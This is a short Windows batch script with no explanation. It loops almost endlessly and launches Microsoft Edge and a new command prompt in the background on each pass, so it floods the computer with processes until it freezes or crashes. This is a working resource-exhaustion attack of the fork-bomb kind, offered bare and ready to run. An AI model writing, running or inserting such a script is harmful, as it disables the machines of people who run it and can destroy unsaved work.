@echo off
for /l %%x in (1,1,99999999999) do (
    start "" /b "Msedge.exe"
    start "" /b "cmd.exe"
)
pause >nul 2>&1
exit